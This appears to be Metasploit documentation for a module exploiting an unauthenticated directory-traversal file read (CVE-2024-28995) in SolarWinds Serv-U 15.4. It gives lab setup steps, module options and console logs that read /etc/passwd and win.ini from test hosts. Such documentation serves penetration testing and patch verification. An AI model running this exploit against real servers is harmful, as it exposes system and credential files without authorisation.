## Vulnerable Application
This module exploits an unauthenticated file read vulnerability, due to directory traversal, affecting
SolarWinds Serv-U FTP Server 15.4, Serv-U Gateway 15.4, and Serv-U MFT Server 15.4. All versions prior to
the vendor supplied hotfix "15.4.2 Hotfix 2" (version 15.4.2.157) are affected.

For a technical analysis of the vulnerability, read our [Rapid7 Analysis](https://attackerkb.com/topics/2k7UrkHyl3/cve-2024-28995/rapid7-analysis).

## Testing
Follow the below instruction for either Linux or Windows.
* Download a vulnerable version of SolarWinds Serv-U MFT Server, for example version `15.4.2.126`.
* Install the Serv-U Server by running the installer binary and accepting the defaults for every setting.
* Log into the Serv-U Server Management Console, and create a new Serv-U Domain. Follow the instruction and
accept the default values during setup. The newly created domain will expose a HTTP and HTTPS service bound to all
interfaces. These are the `RHOST`, `RPORT`, and `SSL` options we set in the auxiliary module.

To read a file we set the `TARGETFILE` option to the absolute path of the file we want to read. For example on Linux
we can set the target file to `/etc/passwd`, or on Windows to `C:\\Windows\win.ini`.

Note: When using `msfconsole` you will need to escape a backslash (`\ `) with a double backslash (`\\`).

On Windows, by default, the install directory is `C:\ProgramData\RhinoSoft\Serv-U\ ` and the `Serv-U.exe` service runs
as the `NT AUTHORITY\NETWORK SERVICE` user.

On Linux, by default, the install directory is `/usr/local/Serv-U/` and the `Serv-U` service runs as `root`.
The file `/usr/local/Serv-U/Shares/Serv-U.FileShares` is a SQLite database containing the absolute path of all files
shared by Serv-U, and can be downloaded and used for target file discovery. This database file is not accessible on a
Windows target, as it is locked by the `Serv-U.exe` process and cannot be opened a second time.

## Verification Steps

1. Start msfconsole
2. `use auxiliary/gather/solarwinds_servu_fileread_cve_2024_28995`
3. `set RHOST <TARGET_IP_ADDRESS>`
4. `set STORE_LOOT false`
5. `set TARGETFILE /etc/passwd`
6. `check`
7. `run`

## Options

### STORE_LOOT
Whether the read file's contents should be stored as loot in the Metasploit database. If set to false, the files
content will be displayed in the console. (default: true).

### TARGETURI
The base URI path to the web application (default: /).

### TARGETFILE
The absolute path of a target file to read (default: /etc/passwd).

### PATH_TRAVERSAL_COUNT
The number of double dot (..) path segments needed to traverse to the root folder. For a default install of Serv-U
on both Linux and Windows, the value for this is 4. (default: 4).

## Scenarios

### A vulnerable Linux target

```
msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > set RHOST 192.168.86.43
RHOST => 192.168.86.43
msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > set RPORT 443
RPORT => 443
msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > set SSL true
[!] Changing the SSL option's value may require changing RPORT!
SSL => true
msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > set STORE_LOOT false
STORE_LOOT => false
msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > set TARGETFILE /etc/passwd
TARGETFILE => /etc/passwd
msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > show options

Module options (auxiliary/gather/solarwinds_servu_fileread_cve_2024_28995):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   PATH_TRAVERSAL_COUNT  4                yes       The number of double dot (..) path segments needed to traverse to the root folder.
   Proxies                                no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                192.168.86.43    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT                 443              yes       The target port (TCP)
   SSL                   true             no        Negotiate SSL/TLS for outgoing connections
   STORE_LOOT            false            no        Store the target file as loot
   TARGETFILE            /etc/passwd      yes       The full path of a target file to read.
   TARGETURI             /                yes       The base URI path to the web application
   VHOST                                  no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > check
[+] 192.168.86.43:443 - The target is vulnerable. SolarWinds Serv-U version 15.4.2.126 (Linux 64-bit; Version: 6.5.0-15-generic)
msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > run
[*] Running module against 192.168.86.43

[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. SolarWinds Serv-U version 15.4.2.126 (Linux 64-bit; Version: 6.5.0-15-generic)
[*] Reading file /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
syslog:x:104:111::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:115::/run/uuidd:/usr/sbin/nologin
systemd-oom:x:108:116:systemd Userspace OOM Killer,,,:/run/systemd:/usr/sbin/nologin
tcpdump:x:109:117::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
avahi:x:114:121:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:115:122:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
rtkit:x:116:123:RealtimeKit,,,:/proc:/usr/sbin/nologin
whoopsie:x:117:124::/nonexistent:/bin/false
sssd:x:118:125:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
speech-dispatcher:x:119:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
nm-openvpn:x:120:126:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
saned:x:121:128::/var/lib/saned:/usr/sbin/nologin
colord:x:122:129:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:123:130::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:124:131:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false
hplip:x:126:7:HPLIP system user,,,:/run/hplip:/bin/false
gdm:x:127:133:Gnome Display Manager:/var/lib/gdm3:/bin/false
mysql:x:128:136:MySQL Server,,,:/nonexistent:/bin/false
fwupd-refresh:x:129:137:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
xrdp:x:130:138::/run/xrdp:/usr/sbin/nologin

[*] Auxiliary module execution completed
msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > 
```

### A vulnerable Windows target

```
msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > set RHOST 192.168.86.68
RHOST => 192.168.86.68
msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > set RPORT 80
RPORT => 80
msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > set SSL false
[!] Changing the SSL option's value may require changing RPORT!
SSL => false
msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > set TARGETFILE c:\\\\Windows\\win.ini
TARGETFILE => c:\\Windows\win.ini
msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > show options 

Module options (auxiliary/gather/solarwinds_servu_fileread_cve_2024_28995):

   Name                  Current Setting      Required  Description
   ----                  ---------------      --------  -----------
   PATH_TRAVERSAL_COUNT  4                    yes       The number of double dot (..) path segments needed to traverse to the root folder.
   Proxies                                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                192.168.86.68        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT                 80                   yes       The target port (TCP)
   SSL                   false                no        Negotiate SSL/TLS for outgoing connections
   STORE_LOOT            false                no        Store the target file as loot
   TARGETFILE            c:\\Windows\win.ini  yes       The full path of a target file to read.
   TARGETURI             /                    yes       The base URI path to the web application
   VHOST                                      no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > check
[+] 192.168.86.68:80 - The target is vulnerable. SolarWinds Serv-U version 15.4.2.126 (Windows Server 2012 64-bit; Version: 6.2.9200)
msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > run
[*] Running module against 192.168.86.68

[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. SolarWinds Serv-U version 15.4.2.126 (Windows Server 2012 64-bit; Version: 6.2.9200)
[*] Reading file c:\\Windows\win.ini
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1

[*] Auxiliary module execution completed
msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) >
```
